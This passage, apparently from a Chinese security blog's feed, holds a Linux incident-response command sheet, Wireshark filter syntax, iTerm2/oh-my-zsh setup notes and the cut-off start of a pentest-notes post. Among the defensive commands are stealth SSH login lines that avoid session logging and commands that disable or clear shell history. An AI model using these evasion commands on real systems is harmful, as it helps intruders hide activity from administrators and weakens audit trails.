pid (pid表示pid号)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-专项使用"><a href="#4-专项使用" class="headerlink" title="4 专项使用"></a>4 专项使用</h2><h3 id="4-1-ssh"><a href="#4-1-ssh" class="headerlink" title="4.1 ssh"></a>4.1 ssh</h3><h4 id="4-1-1-ssh登录信息"><a href="#4-1-1-ssh登录信息" class="headerlink" title="4.1.1 ssh登录信息"></a>4.1.1 ssh登录信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看当前登录用户（tty本地登陆  pts远程登录）root@iZbp19pfnyuhlghdkeobejZ:~# whoroot     pts&#x2F;0        2020-03-18 10:24 (X.X.X.X)root     pts&#x2F;1        2020-03-18 10:24 (X.X.X.X)#查看当前登录用户root@iZbp19pfnyuhlghdkeobejZ:~# lastroot     pts&#x2F;2        (X.X.X.X)    Wed Mar 18 10:25   still logged inroot     pts&#x2F;1        (X.X.X.X)    Wed Mar 18 10:24 - 10:30  (00:05)root     pts&#x2F;0        (X.X.X.X)    Wed Mar 18 10:24 - 10:25  (00:01)root     pts&#x2F;0        (X.X.X.X)   Wed Mar 18 00:12 - 00:17  (00:04)reboot   system boot  4.9.0-11-amd64   Wed Mar 18 08:12   still running#查看登陆多久、多少用户，负载root@iZbp19pfnyuhlghdkeobejZ:~# uptime 23:00:23 up 22:47,  2 users,  load average: 0.00, 0.01, 0.00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-1-2-ssh隐身登录"><a href="#4-1-2-ssh隐身登录" class="headerlink" title="4.1.2 ssh隐身登录"></a>4.1.2 ssh隐身登录</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ssh -T root@192.168.1.1 &#x2F;bin&#x2F;bash -issh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T root@192.168.1.1 &#x2F;bin&#x2F;bash -if<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-1-3-ssh端口复用"><a href="#4-1-3-ssh端口复用" class="headerlink" title="4.1.3 ssh端口复用"></a>4.1.3 ssh端口复用</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#安装SSLHapt install sslh# 配置SSLH# 编辑 SSLH 配置文件：sudo vi &#x2F;etc&#x2F;default&#x2F;sslh#1、找到下列行：Run&#x3D;no  将其修改为：Run&#x3D;yes#2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443DAEMON_OPTS&#x3D;&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile &#x2F;var&#x2F;run&#x2F;sslh&#x2F;sslh.pid&quot;service sslh start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-1-4-SSH登录"><a href="#4-1-4-SSH登录" class="headerlink" title="4.1.4 SSH登录"></a>4.1.4 SSH登录</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看ssh服务状态&#x2F;etc&#x2F;init.d&#x2F;ssh status如果显示为Active: inactive (dead)就表示没有开启#修改配置文件vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config#原来文件内容#PermitRootLogin prohibit-password#PasswordAuthentication yes#修改后的内容PermitRootLogin yesPasswordAuthentication yes#启动ssh&#x2F;etc&#x2F;init.d&#x2F;ssh start#开机自启update-rc.d ssh enable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-histroy"><a href="#4-2-histroy" class="headerlink" title="4.2 histroy"></a>4.2 histroy</h3><p>两个<code>histroy</code>是命令输入可以直接查看历史执行过命令，<code>.bash_history</code>是文件需要复制到别的文件中查看</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#历史操作命令清除history -c#但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。#历史命令查看#把文件内容发送到history.txt文件中cat .bash_history &gt;&gt; history.txt#直接查看histroy#隐藏历史操作命令#命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。#关闭历史记录#[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录[space]set +o history#开启历史记录#执行命令之后的命令都会出现在历史中。[Space]set -o history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-netstat"><a href="#4-3-netstat" class="headerlink" title="4.3 netstat"></a>4.3 netstat</h3><p>使用<code>netstat </code>网络连接命令，分析可疑端口、<code>IP</code>、<code>PID</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">netstat -antlp|more!netlsof -i:80  #查看指定端口netstat -anp|grep 158.x.x.x  #从连接的IP来定位PID，如果是瞬时建立的才找不到#查看下&#96;pid&#96;所对应的进程文件信息ls -l &#x2F;proc&#x2F;$PID&#x2F;   #可以查看详细进程信息file &#x2F;proc&#x2F;$PID&#x2F;exe #（$PID 为对应的pid 号）cd &#x2F;proc&#x2F;$PID    #可以进入该进程目录ll &#x2F;proc&#x2F;PID   #查看程序对应的启动位置which XXXX      #查看程序在哪个文件夹 XXXX表示程序名 lsof &#x2F;usr&#x2F;bin&#x2F;*  #查看某个路径下的运行中的进程列表pidof &#x2F;usr&#x2F;bin&#x2F;*  #查看某个路径下运行进程的 pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-4-查看定时任务"><a href="#4-4-查看定时任务" class="headerlink" title="4.4 查看定时任务"></a>4.4 查看定时任务</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">crontab -l #查看当前用户定时任务cat &#x2F;etc&#x2F;crontab  #查看定时任务的文件里面是否存在定时任务ls -al &#x2F;var&#x2F;spool&#x2F;cron&#x2F;*        cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;*  #查看文件夹里面是否有其他定时任务的文件ls -al &#x2F;etc&#x2F;cron.d&#x2F;*for u in &#96;cat &#x2F;etc&#x2F;passwd |cut -d  &quot;:&quot; -f1&#96;;do crontab -l -u $u; done  #查看所有用户的定时任务crontab -r #表面上删除定时任务crontab -e  #编辑定时任务解读#前面5个星分别代表分-时-天-月-星期 后面跟命令*     * ***command#（表示每15分钟运行一次）*&#x2F;15  * ***command<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-5-查看ssh密钥"><a href="#4-5-查看ssh密钥" class="headerlink" title="4.5 查看ssh密钥"></a>4.5 查看ssh密钥</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat .ssh&#x2F;authorized_keys  #查看命令&#x2F;root&#x2F;.ssh&#x2F;authorized_keys  #ssh秘钥文件所在路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-6-查看CPU运行"><a href="#4-6-查看CPU运行" class="headerlink" title="4.6 查看CPU运行"></a>4.6 查看CPU运行</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">top<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-7-结束进程"><a href="#4-7-结束进程" class="headerlink" title="4.7 结束进程"></a>4.7 结束进程</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kill PIDkill -9 PID #彻底杀死进程kill -KILL PID  #强制杀死进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-8-查看进程"><a href="#4-8-查看进程" class="headerlink" title="4.8 查看进程"></a>4.8 查看进程</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ps -a #列出的是当前控制终端启动的进程ps -A #系统全部启动进程ps auxf #查看父进程关联的子进程ps -aux #枚举进程命令行,病毒一般都携带可疑的命令行，比如带有url等奇怪的字符串时pstree　#查看进程树<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-9-开机启动的一些路径"><a href="#4-9-开机启动的一些路径" class="headerlink" title="4.9 开机启动的一些路径"></a>4.9 开机启动的一些路径</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;etc&#x2F;rc.d&#x2F;rc&#x2F;etc&#x2F;rc&#x2F;etc&#x2F;rc.local&#x2F;etc&#x2F;rc.d&#x2F;rc.local&#x2F;etc&#x2F;rc.d&#x2F;rc&#x2F;etc&#x2F;rc$runlevel.d&#x2F; #该目录下都是链接的可执行文件，也可以自己添加可执行程序&#x2F;etc&#x2F;ld.so.cache   &#x2F;etc&#x2F;ld.so.preload &#x2F;usr&#x2F;local&#x2F;lib&#x2F;libioset.so&#x2F;etc&#x2F;init.d#另外一个添加启动项的地方在  &#x2F;etc&#x2F;profile里面，还有  &#x2F;etc&#x2F;profile.d&#x2F;目录下以sh结尾的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-10-封禁IP"><a href="#4-10-封禁IP" class="headerlink" title="4.10 封禁IP"></a>4.10 封禁IP</h3><p>参数<code>-I</code>是表示<code>Insert</code>（添加），<code>-D</code>表示<code>Delete</code>（删除）。后面跟的是规则，<code>INPUT</code>表示入站，<code>1.1.1.1</code>表示要封停的<code>IP</code>，<code>DROP</code>表示放弃连接</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptables -I INPUT -s 1.1.1.1 -j DROP  #封禁IP进口iptables -I OUTPUT -s 1.1.1.1&#x2F;24 -j DROP#封禁IP出口iptables -I INPUT -s 1.1.1.1&#x2F;24 -j DROP  #封禁IP段iptables --list  #查看规则<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>对<code>IP</code>限制后保存信息</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install iptables-serviceschkconfig iptables onservice iptables savecat &#x2F;etc&#x2F;sysconfig&#x2F;iptablesservice iptables startiptables -nL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-11-查看系统服务"><a href="#4-11-查看系统服务" class="headerlink" title="4.11 查看系统服务"></a>4.11 查看系统服务</h3><ul><li>如果删除了计划任务，还有文件删除不了 可以查看系统服务是否存在病毒</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chkconfig –list        #列出所有的系统服务chkconfig –add httpd        #增加httpd服务chkconfig –del httpd        #删除httpd服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-12-文件下载"><a href="#4-12-文件下载" class="headerlink" title="4.12 文件下载"></a>4.12 文件下载</h3><ul><li>如果关闭了<code>FTP</code>，又无法使用<code>xftp</code>访问卡原始用<code>scp</code>命令下载</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">scp -r 目标文件路径  root@1.1.1.1:&#x2F;home&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-13-文件限制"><a href="#4-13-文件限制" class="headerlink" title="4.13 文件限制"></a>4.13 文件限制</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chmod 000 &#x2F;usr&#x2F;bin&#x2F;XXXXXX  #设置一个文件权限为空(就是什么权限都没有chattr +i &#x2F;usr&#x2F;bin   #限制对&#x2F;usr&#x2F;bin路径修改chattr -i &#x2F;usr&#x2F;bin  #开放对&#x2F;usr&#x2F;bin路径修改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-14-alias-定义或显示别名"><a href="#4-14-alias-定义或显示别名" class="headerlink" title="4.14 alias  定义或显示别名"></a>4.14 alias  定义或显示别名</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 显示全部已定义的别名aliasalias -p# 显示已定义的别名（假设当前环境存在以下别名）alias lsalias ls grep# 定义或修改别名的值alias ls&#x3D;&#39;ls --color&#x3D;auto&#39;alias ls&#x3D;&#39;ls --color&#x3D;never&#39; grep&#x3D;&#39;grep --color&#x3D;never&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark 语法</title>
      <link href="2020/05/27/wireshark-yu-fa/"/>
      <url>2020/05/27/wireshark-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark语法"><a href="#Wireshark语法" class="headerlink" title="Wireshark语法"></a>Wireshark语法</h1><span id="more"></span><h2 id="1-1-过滤IP"><a href="#1-1-过滤IP" class="headerlink" title="1.1 过滤IP"></a>1.1 过滤IP</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ip.src eq ## ip.src &#x3D;&#x3D; 显示来源IPip.dst eq ## ip.dst &#x3D;&#x3D; 显示目的IPip.addr eq ##显示IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="1-2-过滤端口"><a href="#1-2-过滤端口" class="headerlink" title="1.2 过滤端口"></a>1.2 过滤端口</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcp.port eq 3306 #不管端口是来源还是目标都显示tcp.dstport&#x3D;&#x3D;80 #只显示tcp协议的目标端口80tcp.srcport&#x3D;&#x3D;80 #只显示tcp协议的来源端口80tcp.port&gt;&#x3D;1 and tcp.port &lt;&#x3D;80 #过滤端口范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-3-过滤协议"><a href="#1-3-过滤协议" class="headerlink" title="1.3 过滤协议"></a>1.3 过滤协议</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcpudparpicmphttpsmtpfrpdnsmsnmsipssloicpbootp!arp &#x2F; not arp #排除ARP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-4-过滤MAC"><a href="#1-4-过滤MAC" class="headerlink" title="1.4 过滤MAC"></a>1.4 过滤MAC</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">　eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤目标mac　　eth.src eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源mac　　eth.dst&#x3D;&#x3D;A0:00:00:04:C5:84　　eth.dst&#x3D;&#x3D;A0-00-00-04-C5-84　　eth.addr eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的　　less than 小于 &lt; lt　　小于等于 le　　等于 eq　　大于 gt　　大于等于 ge　　不等 ne<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-5包长度过滤"><a href="#1-5包长度过滤" class="headerlink" title="1.5包长度过滤"></a>1.5包长度过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">udp.length &#x3D;&#x3D; 26 这个长度是指udp本身固定长度8加上udp下面那块数据包之和　　tcp.len &gt;&#x3D; 7 指的是ip数据包(tcp下面那块数据),不包括tcp本身　　ip.len &#x3D;&#x3D; 94 除了以太网头固定长度14,其它都算是ip.len,即从ip本身到最后　　frame.len &#x3D;&#x3D; 119 整个数据包长度,从eth开始到最后　　eth —&gt; ip or arp —&gt; tcp or udp —&gt; data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-6-http-模式过滤"><a href="#1-6-http-模式过滤" class="headerlink" title="1.6 http 模式过滤"></a>1.6 http 模式过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">　http.request.method &#x3D;&#x3D; &quot;GET”　　http.request.method &#x3D;&#x3D; &quot;POST”　　http.request.uri &#x3D;&#x3D; &quot;&#x2F;img&#x2F;logo-edu.gif”　　http contains &quot;GET”　　http contains &quot;HTTP&#x2F;1.”　　&#x2F;&#x2F; GET包　　http.request.method &#x3D;&#x3D; &quot;GET” &amp;&amp; http contains &quot;Host: &quot;　　http.request.method &#x3D;&#x3D; &quot;GET” &amp;&amp; http contains &quot;User-Agent: &quot;　　&#x2F;&#x2F; POST包　　http.request.method &#x3D;&#x3D; &quot;POST” &amp;&amp; http contains &quot;Host: &quot;　　http.request.method &#x3D;&#x3D; &quot;POST” &amp;&amp; http contains &quot;User-Agent: &quot;　　&#x2F;&#x2F; 响应包　　http contains &quot;HTTP&#x2F;1.1 200 OK” &amp;&amp; http contains &quot;Content-Type: &quot;　　http contains &quot;HTTP&#x2F;1.0 200 OK” &amp;&amp; http contains &quot;Content-Type: &quot;　　一定包含如下　　Content-Type:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-7-TCP-参数过滤"><a href="#1-7-TCP-参数过滤" class="headerlink" title="1.7 TCP 参数过滤"></a>1.7 TCP 参数过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcp.flags 显示包含TCP标志的封包。　　tcp.flags.syn &#x3D;&#x3D; 0x02 显示包含TCP SYN标志的封包。　　tcp.window_size &#x3D;&#x3D; 0 &amp;&amp; tcp.flags.reset !&#x3D; 1　　8.包内容过滤　　tcp[20]表示从20开始，取1个字符　　tcp[20:]表示从20开始，取1个字符以上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iterm2配置</title>
      <link href="2020/03/10/iterm2-pei-zhi/"/>
      <url>2020/03/10/iterm2-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="ITerm2-配置"><a href="#ITerm2-配置" class="headerlink" title="ITerm2 配置"></a>ITerm2 配置</h1><span id="more"></span><h2 id="1-安装oh-my-zsh"><a href="#1-安装oh-my-zsh" class="headerlink" title="1 安装oh-my-zsh"></a>1 安装oh-my-zsh</h2><h3 id="1-1-查看系统存在几个shell"><a href="#1-1-查看系统存在几个shell" class="headerlink" title="1.1 查看系统存在几个shell"></a>1.1 查看系统存在几个shell</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat &#x2F;etc&#x2F;shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># List of acceptable shells for chpass(1).# Ftpd will not allow users to connect who are not using# one of these shells.&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;csh&#x2F;bin&#x2F;dash&#x2F;bin&#x2F;ksh&#x2F;bin&#x2F;sh&#x2F;bin&#x2F;tcsh&#x2F;bin&#x2F;zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bash是mac中terminal自带的shell，把它换成zsh，这个的功能要多得多。拥有语法高亮，命令行tab补全，自动提示符，显示Git仓库状态等功能</p><p>设置默认shell</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chsh -s &#x2F;bin&#x2F;zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-安装oh-my-zsh"><a href="#1-2-安装oh-my-zsh" class="headerlink" title="1.2 安装oh-my-zsh"></a>1.2 安装oh-my-zsh</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">https:&#x2F;&#x2F;github.com&#x2F;ohmyzsh&#x2F;ohmyzsh #github地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cp -r ohmyzsh ~&#x2F;.oh-my-zsh## 复制.zshrccp ohmyzsh&#x2F;templates&#x2F;zshrc.zsh-template ~&#x2F;.zshrc## shell换成zshchsh -s &#x2F;bin&#x2F;zsh #安装好之后，需要把 Zsh 设置为当前用户的默认 Shell（这样新建标签的时候才会使用 Zsh）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之前.zshrc 配置了mvn,记得重新加上</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">MAVEN_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;apache-maven-3.6.3PATH&#x3D;$MAVEN_HOME&#x2F;bin:$PATHexport MAVEN_HOMEexport PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>主题修改为<code>ZSH_THEME=&quot;agnoster&quot;</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim ~&#x2F;.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/03/10/iterm2-pei-zhi/img-1.png" class="slug"><!--`agnoster`是比较常用的 zsh 主题之一，你可以挑选你喜欢的主题，zsh 主题列表：[https://github.com/robbyrussell/oh-my-zsh/wiki/themes](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Frobbyrussell%2Foh-my-zsh%2Fwiki%2Fthemes)--><h3 id="1-3-配置Meslo字体"><a href="#1-3-配置Meslo字体" class="headerlink" title="1.3 配置Meslo字体"></a>1.3 配置Meslo字体</h3><p>使用上面的主题，需要 Meslo 字体支持，要不然会出现乱码的情况，字体下载地址：<a href="https://links.jianshu.com/go?to=https://github.com/powerline/fonts/blob/master/Meslo%20Slashed/Meslo%20LG%20M%20Regular%20for%20Powerline.ttf">Meslo LG M Regular for Powerline.ttf</a></p><p>下载好之后，找到对应的字体,直接在 Mac OS 中安装即可。</p><p>然后打开 iTerm2，按<code>Command + ,</code>键，打开 Preferences 配置界面，然后<code>Profiles -&gt; Text -&gt; Font -&gt; Chanage Font</code>，选择 Meslo LG M Regular for Powerline 字体。</p><h3 id="1-4-声明高亮"><a href="#1-4-声明高亮" class="headerlink" title="1.4 声明高亮"></a>1.4 声明高亮</h3><p>特殊命令和错误命令，会有高亮显示。</p><p>使用 Homebrew 安装：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ brew install zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装成功之后，编辑vim ~/.zshrc文件，在最后一行增加下面配置：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">source &#x2F;usr&#x2F;local&#x2F;share&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-5-自动建议填充"><a href="#1-5-自动建议填充" class="headerlink" title="1.5 自动建议填充"></a>1.5 自动建议填充</h3><p>这个功能是非常实用的，可以方便我们快速的敲命令</p><p>配置步骤，先克隆zsh-autosuggestions项目，到指定目录：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions # github地址mv zsh-autosuggestions ~&#x2F;.oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后编辑<code>vim ~/.zshrc</code>文件，找到plugins配置，增加<code>zsh-autosuggestions</code>插件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim ~&#x2F;.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/03/10/iterm2-pei-zhi/img-2.png" class="slug"><h3 id="1-6-iTerm2-快速隐藏和显示窗体"><a href="#1-6-iTerm2-快速隐藏和显示窗体" class="headerlink" title="1.6 iTerm2 快速隐藏和显示窗体"></a>1.6 iTerm2 快速隐藏和显示窗体</h3><p>打开 iTerm2，按<code>Command + ,</code>键，打开 Preferences 配置界面，然后Profiles → Keys →Hotkey，自定义一个快捷键就可以了。</p><img src="/2020/03/10/iterm2-pei-zhi/img-3.png" class="slug"><h3 id="1-7-iTerm2-隐藏用户名和主机名"><a href="#1-7-iTerm2-隐藏用户名和主机名" class="headerlink" title="1.7 iTerm2 隐藏用户名和主机名"></a>1.7 iTerm2 隐藏用户名和主机名</h3><p>有时候我们的用户名和主机名太长，终端显示的时候会很不好看，我们可以手动去除。</p><p>编辑<code>vim ~/.zshrc</code>文件，增加<code>DEFAULT_USER=&quot;SKong&quot;</code>配置.</p><p>但是: 我的电脑没生效,至今未找到原因~~~<br><code>补充:已经找到原因,这个地方应该设置为: DEFAULT_USER=&quot;你电脑的用户名&quot;</code><br>比如:我的电脑用户名为pactepacterara,则DEFAULT_USER=”pactepacterara”<br>感谢网友<a href="https://blog.csdn.net/u/c57aa48a99b8">码渣</a>!</p><img src="/2020/03/10/iterm2-pei-zhi/img-4.png" class="slug"><h3 id="1-8-Iterm2-快捷指令"><a href="#1-8-Iterm2-快捷指令" class="headerlink" title="1.8 Iterm2 快捷指令"></a>1.8 Iterm2 快捷指令</h3><p>在iterm2中，选中某个路径或者某个词汇，iterm2就自动复制了,很方便。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">command + enter 进入与返回全屏模式command + t 新建标签command + w 关闭标签command + 数字 command + 左右方向键    切换标签command + enter 切换全屏command + f 查找command + d 水平分屏command + shift + d 垂直分屏command + option + 方向键 command + [ 或 command + ]    切换屏幕command + ; 查看历史命令command + shift + h 查看剪贴板历史ctrl + u    清除当前行ctrl + l    清屏ctrl + a    到行首ctrl + e    到行尾ctrl + f&#x2F;b  前进后退ctrl + p    上一条命令ctrl + r    搜索命令历史<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-9-卸载oh-my-zsh"><a href="#1-9-卸载oh-my-zsh" class="headerlink" title="1.9 卸载oh-my-zsh"></a>1.9 卸载oh-my-zsh</h3><p>进入到.oh-my-zsh/tools目录,依次执行</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$cd .oh-my-zsh&#x2F;toolschmod +x uninstall.sh.&#x2F;uninstall.shrm -rif .zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关于-oh-my-zsh-提示检测到不安全的完成相关目录"><a href="#关于-oh-my-zsh-提示检测到不安全的完成相关目录" class="headerlink" title="关于[oh-my-zsh] 提示检测到不安全的完成相关目录"></a>关于[oh-my-zsh] 提示检测到不安全的完成相关目录</h2><ol><li>在.zshrc文件的第一行添加 <code>ZSH_DISABLE_COMPFIX=true</code></li></ol><p>参考链接：<a href="https://blog.csdn.net/qq_36955294/article/details/109340448?utm_term=iterm2%E9%85%8D%E7%BD%AE&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-109340448&amp;spm=3001.4430">https://blog.csdn.net/qq_36955294/article/details/109340448?utm_term=iterm2%E9%85%8D%E7%BD%AE&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-109340448&amp;spm=3001.4430</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode</title>
      <link href="2020/03/10/shellcode-chu-ti-yan/"/>
      <url>2020/03/10/shellcode-chu-ti-yan/</url>
      
        <content type="html"><![CDATA[<ul><li>Author:小y</li><li>公众号:关注安全技术<br><img src="./img/wechat.png" alt="image"><h1 id="Pentest-Note"><a href="#Pentest-Note" class="headerlink" title="Pentest_Note"></a>Pentest_Note</h1><h3 id="转载请随意，记得加from"><a href="#转载请随意，记得加from" class="headerlink" title="转载请随意，记得加from"></a>转载请随意，记得加from</h3><h3 id="声明1："><a href="#声明1：" class="headerlink" title="声明1："></a>声明1：</h3>  依照《中华人民共和国网络安全法》等相关法规规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。<h3 id="声明2："><a href="#声明2：" class="headerlink" title="声明2："></a>声明2：</h3>  以下内容均在本地完成复现，不涉及任何非法行为，不允许使用本项目所提及的所有技术内容进行非法行为，使用技术的风险由使用者自行承担。</li></ul><ul><li><p><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></p><ul><li><a href="#whois">Whois</a></li><li><a href="#%E7%BD%91%E7%AB%99ip">网站IP</a><ul><li><a href="#%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8cdn">是否存在CDN</a></li><li><a href="#bypass-cdn%E5%B8%B8%E8%A7%84%E6%96%B9%E5%BC%8F">Bypass 